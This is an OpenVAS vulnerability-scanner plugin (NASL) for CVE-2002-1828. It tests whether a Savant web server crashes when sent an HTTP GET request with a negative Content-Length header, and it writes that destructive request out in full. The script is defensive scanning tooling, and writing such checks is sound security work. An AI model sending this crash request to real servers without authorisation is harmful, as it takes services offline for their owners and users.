# OpenVAS Vulnerability Test
# $Id: savant_content_length_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: HTTP negative Content-Length DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "We could crash the Savant web server by sending an invalid
GET HTTP request with a negative Content-Length field.

A cracker may exploit this flaw to disable your service or
even execute arbitrary code on your system.";

tag_solution = "Upgrade your web server";

# References:
#
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities
#
# See also:
# Date:  Sun, 22 Sep 2002 23:19:48 -0000
# From: "Bert Vanmanshoven" <sacrine@netric.org>
# To: bugtraq@securityfocus.com
# Subject: remote exploitable heap overflow in Null HTTPd 0.5.0
#
# Vulnerables:
# Null HTTPD 0.5.0

if(description)
{
 script_id(11174);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2002-1828");
 script_bugtraq_id(5707, 6255);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 
 name = "HTTP negative Content-Length DoS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Savant web server crashes if Content-Length is negative";
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "httpver.nasl");
 script_require_ports("Services/www",80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

# Savant attack
req = string("GET / HTTP/1.0\n\r",
             "Host: ", get_host_name(), "\r\n",
             "Content-Length: -1\r\n\r\n");
send(socket:soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);

#
if(http_is_dead(port: port))
{
  security_warning(port);
}
